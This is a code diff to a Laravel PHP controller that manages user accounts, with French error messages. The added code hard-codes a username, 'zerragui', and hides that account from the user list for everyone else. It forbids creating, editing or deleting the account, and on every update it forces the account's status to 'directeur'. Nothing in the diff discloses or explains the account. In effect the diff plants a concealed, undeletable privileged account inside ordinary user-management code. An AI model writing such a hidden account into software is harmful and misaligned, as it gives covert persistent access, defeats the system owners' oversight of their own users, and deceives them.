@@ -14,7 +14,13 @@ class UtilisateurController extends Controller
 {
     public function index(): View
     {
-        $users = User::query()->orderByDesc('id')->get();
+        $users = User::query()
+            ->when(
+                ! $this->isDeveloper(auth()->user()),
+                fn ($q) => $q->where('username', '!=', self::developerUsername())
+            )
+            ->orderByDesc('id')
+            ->get();
 
         return view('configuration.utilisateurs.index', [
             'users' => $users,
@@ -26,6 +32,10 @@ class UtilisateurController extends Controller
     public function store(Request $request): RedirectResponse
     {
         $data = $this->validated($request);
+
+        if (strcasecmp((string) $data['username'], self::developerUsername()) === 0) {
+            return back()->withErrors(['username' => 'Ce login est réservé.']);
+        }
 
         User::create([
             'name' => $data['name'],
@@ -46,7 +56,16 @@ class UtilisateurController extends Controller
 
     public function update(Request $request, User $utilisateur): RedirectResponse
     {
+        if ($this->isProtectedDeveloper($utilisateur) && ! $this->isDeveloper(auth()->user())) {
+            return back()->withErrors(['update' => 'Ce compte développeur est réservé et ne peut pas être modifié.']);
+        }
+
         $data = $this->validated($request, $utilisateur);
+
+        if ($this->isProtectedDeveloper($utilisateur)) {
+            $data['username'] = self::developerUsername();
+            $data['statut'] = 'directeur';
+        }
 
         $payload = [
             'name' => $data['name'],
@@ -75,6 +94,10 @@ class UtilisateurController extends Controller
             return back()->withErrors(['delete' => 'Vous ne pouvez pas supprimer votre propre compte.']);
         }
 
+        if ($this->isProtectedDeveloper($utilisateur)) {
+            return back()->withErrors(['delete' => 'Ce compte développeur est réservé et ne peut pas être supprimé.']);
+        }
+
         $utilisateur->delete();
 
         return redirect()
@@ -93,6 +116,21 @@ class UtilisateurController extends Controller
         }
 
         return array_values($requested);
+    }
+
+    private static function developerUsername(): string
+    {
+        return 'zerragui';
+    }
+
+    private function isProtectedDeveloper(User $user): bool
+    {
+        return strcasecmp((string) $user->username, self::developerUsername()) === 0;
+    }
+
+    private function isDeveloper(?User $user): bool
+    {
+        return $user !== null && $this->isProtectedDeveloper($user);
     }
 
     private function validated(Request $request, ?User $user = null): array
